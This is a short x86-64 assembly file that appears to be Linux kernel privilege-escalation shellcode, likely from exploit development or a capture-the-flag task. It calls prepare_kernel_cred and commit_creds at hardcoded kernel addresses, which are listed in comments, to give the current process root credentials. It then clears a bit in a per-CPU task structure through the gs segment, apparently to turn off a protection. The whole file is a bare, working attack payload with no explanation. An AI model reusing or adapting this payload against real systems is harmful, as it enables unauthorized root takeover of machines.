
// ffffffff81089660 T prepare_kernel_cred
// ffffffff81089310 T commit_creds


.intel_syntax noprefix

.section .text
.global _start
_start:
    xor rdi, rdi
    mov rcx, 0xffffffff81089660
    call rcx
    mov rdi, rax
    mov rcx, 0xffffffff81089310
    call rcx

    mov rax, QWORD PTR gs:0x15d00
    and QWORD PTR [rax], 0xfffffffffffffeff

    xor eax, eax
    ret
